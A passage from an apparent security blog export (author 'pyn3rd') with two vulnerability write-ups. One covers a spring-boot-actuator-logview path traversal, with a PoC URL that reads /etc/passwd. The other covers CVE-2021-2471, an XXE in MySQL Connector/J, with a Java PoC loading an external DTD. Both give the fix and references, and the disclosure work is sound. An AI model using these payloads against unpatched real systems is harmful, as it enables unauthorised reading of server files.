basePath, so the attacker can construct payload with the evasion of check in basePath. ReviewStart up tomcat server of SpringBoot project, if the page looks like this, it means SpringBoot Actutor Logview works well. Set break piont at securityCheck() meanwhile sending a HTTP request with the PoC http://localhost:8887/manage/log/view?filename=/etc/passwd&amp;base=../../../../../, then you will step into the screenshot as follow Firstly step into lggingPath() Then step into streamContent,here you can see spring.log/../../../../../ as folder, and /etc/passwd is the file we want to read. Next step into toFile() method , the folder spring.log/../../../../../ and the file /etc/passwd will be concated as the final path without secrity check any more. Consequently you can retreive the content of file /etc/passwd Proof of Concepthttp://localhost:8887/manage/log/view?filename=/etc/passwd&amp;base=../../../../../ FixFrom spring-boot-actuator-logview 0.2.13, basePath has strict security check, the path traversal is not permitted any more. Referencehttps://github.com/lukashinsch/spring-boot-actuator-logview/commit/760acbb939a8d1f7d1a7dfcd51ca848eea04e772","categories":[],"tags":[],"author":"pyn3rd"},{"title":"CVE-2021-2471 MySQL JDBC Connector XXE","slug":"mysql-jdbc-xxe","date":"2021-10-22T06:33:00.000Z","updated":"2023-02-06T09:25:34.712Z","comments":true,"path":"2021/10/22/mysql-jdbc-xxe/","link":"","permalink":"http://yoursite.com/2021/10/22/mysql-jdbc-xxe/","excerpt":"","text":"AbstractPrior to MySQL Connector/J 8.0.27, the getSource() method exists in MysqlSQLXML, but the getSource() method has no security check when external general entities included in XML sources, consequently, here exists a XXE vulnerability. ReviewSet break piont at the getSource() method, according to the source code, if the class is DOMSource , DocumentBuilder will be utilized to parse the XML source data. Unfortunately, there is no any security check when a new instance created. So we can construct a XML with external entities. However, from MySQL Connector/J 8.0.27, security attributes are set up to check XML sources before the object instantiated. Proof of Concept1234567891011import com.mysql.cj.jdbc.MysqlSQLXML;import javax.xml.transform.dom.DOMSource;import java.sql.SQLException;public class MySQLDemo &#123; public static void main(String[] args) throws SQLException &#123; MysqlSQLXML myXML = new MysqlSQLXML(null); myXML.setString(&quot;&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM \\&quot;http://127.0.0.1:8000/test.dtd\\&quot;&gt; %xxe;]&gt;&quot;); myXML.getSource(DOMSource.class); &#125;&#125; FixIn line with good XML practices, the getSource() method of MysqlSQLXML no longer supports external DTD, external general entities, and external general parameters in XML sources. Timeline 2021/07/10 Report to Oracle 2021/07/23 Fix the issue 2021/10/19 Credit and assign CVE number 2021/10/19 Release MySQL Connector/J 8.0.27 Referencehttps://www.oracle.com/security-alerts/cpuoct2021.htmlhttps://dev.mysql.com/doc/relnotes/connector-j/8.0/en/news-8-0-27.htmlhttps://github.com/mysql/mysql-connector-j/commits/4993d5735fd84a46e7d949ad1bcaa0e9bb039824/src/main/user-impl/java/com/mysql/cj/jdbc/MysqlSQLXML.java","categories":[],"tags":[],"author":"pyn3rd"}],"categories":[],"tags":[]}